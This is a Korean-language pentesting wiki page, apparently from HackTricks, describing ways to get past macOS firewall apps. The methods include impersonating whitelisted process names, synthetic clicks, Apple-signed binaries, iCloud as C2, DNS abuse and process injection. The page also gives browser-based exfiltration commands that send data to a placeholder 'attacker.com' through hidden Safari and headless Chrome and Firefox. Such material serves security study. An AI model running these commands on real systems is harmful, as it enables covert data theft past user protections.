# macOS 방화벽 우회

{{#include ../../banners/hacktricks-training.md}}

## 발견된 기술

다음 기술은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.

### 화이트리스트 이름 악용

- 예를 들어 **`launchd`**와 같은 잘 알려진 macOS 프로세스의 이름으로 악성 코드를 호출하기

### 합성 클릭

- 방화벽이 사용자에게 권한을 요청하면 악성 코드가 **허용 클릭**하기

### **Apple 서명 이진 파일 사용**

- **`curl`**과 같은 것들, 하지만 **`whois`**와 같은 다른 것들도 포함

### 잘 알려진 애플 도메인

방화벽이 **`apple.com`** 또는 **`icloud.com`**과 같은 잘 알려진 애플 도메인에 대한 연결을 허용할 수 있습니다. 그리고 iCloud는 C2로 사용될 수 있습니다.

### 일반적인 우회

방화벽을 우회하기 위해 시도할 수 있는 몇 가지 아이디어

### 허용된 트래픽 확인

허용된 트래픽을 아는 것은 잠재적으로 화이트리스트에 있는 도메인이나 어떤 애플리케이션이 이를 접근할 수 있는지 식별하는 데 도움이 됩니다.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 악용

DNS 해석은 **`mdnsreponder`** 서명된 애플리케이션을 통해 이루어지며, 이는 아마도 DNS 서버에 연락할 수 있도록 허용될 것입니다.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 브라우저 앱을 통한 방법

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- 구글 크롬
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- 파이어폭스
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- 사파리
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 프로세스 주입을 통한 방법

서버에 연결할 수 있는 프로세스에 **코드를 주입**할 수 있다면 방화벽 보호를 우회할 수 있습니다:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## 참고자료

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
